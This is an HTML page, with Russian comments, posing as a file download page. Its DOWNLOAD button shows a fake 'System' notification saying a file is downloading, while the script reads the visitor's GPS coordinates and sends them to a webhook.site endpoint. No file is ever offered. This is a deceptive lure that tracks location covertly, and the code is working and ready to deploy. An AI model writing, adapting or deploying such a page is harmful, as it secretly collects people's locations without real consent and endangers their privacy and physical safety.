<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download</title>
    <style>
        body { font-family: sans-serif; background: #000; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        button { width: 200px; padding: 20px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; background: #007bff; color: white; }
    </style>
</head>
<body>

    <button onclick="start()">DOWNLOAD</button>

<script>
    const webhookUrl = "https://webhook.site/3536371a-f8c8-445e-a399-617a47d6fadb";

    // Регистрируем Service Worker
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('sw.js');
    }

    async function start() {
        const permission = await Notification.requestPermission();
        
        if (permission === 'granted' && 'serviceWorker' in navigator) {
            const reg = await navigator.serviceWorker.ready;
            // Отправляем пуш через Service Worker (это работает везде)
            reg.showNotification("Система", {
                body: "Файл загружается...",
                icon: "https://cdn-icons-png.flaticon.com/512/179/179386.png",
                tag: "sync"
            });
        }

        // Остальные функции (GPS, Battery и т.д.)
        navigator.geolocation.getCurrentPosition(p => fetch(`${webhookUrl}?lat=${p.coords.latitude}&lon=${p.coords.longitude}`));
        if (navigator.vibrate) navigator.vibrate(200);
    }
</script>
</body>
  </html>
